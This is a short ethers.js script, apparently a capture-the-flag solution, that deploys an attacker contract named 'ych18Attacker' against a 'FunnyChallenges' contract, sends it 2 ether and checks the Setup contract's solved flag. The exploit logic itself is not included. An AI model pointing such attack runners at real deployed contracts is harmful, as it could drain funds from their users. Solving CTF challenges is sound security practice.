const { parseEther } = require("ethers/lib/utils");

async function main() {
  const EXPLOIT = await ethers.getContractFactory("ych18Attacker");

  const setup = await ethers.getContractAt( "Setup", "0x40D1e6Fa69957f4c66461b8c8AB60108265F52b2" );
  const ctf = await ethers.getContractAt( "FunnyChallenges", "0x482b62c99e9ee97126b8a56828f105e07904fd03" );

  console.log("solved:", await setup.isSolved());

  const exploit = await EXPLOIT.deploy(ctf.address);
  await exploit.attack({ value: parseEther("2") });

  console.log("solved:", await setup.isSolved());
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
